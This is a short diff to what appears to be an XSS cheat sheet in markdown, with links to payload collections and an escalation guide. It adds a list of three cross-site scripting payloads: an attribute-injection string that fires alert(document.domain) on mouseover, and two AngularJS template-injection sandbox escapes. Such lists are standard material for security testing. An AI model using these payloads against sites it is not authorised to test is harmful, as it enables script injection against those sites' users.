@@ -4,6 +4,12 @@ JavaScript://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Scri
 ```
 ### XSS payloads
 `https://github.com/foospidy/payloads/tree/master/other/xss`
+### Payload list
+```
+"style="position:fixed;top:0;left:0;border:999em solid green;" onmouseover="alert(document.domain)"
+{{_c.constructor('alert(1)')()}}
+{{constructor.constructor('alert(1)')()}}
+```
 #### XSS escalation
 `https://www.bugcrowd.com/blog/the-ultimate-guide-to-finding-and-escalating-xss-bugs/`
 ### Quick simple payload to use 
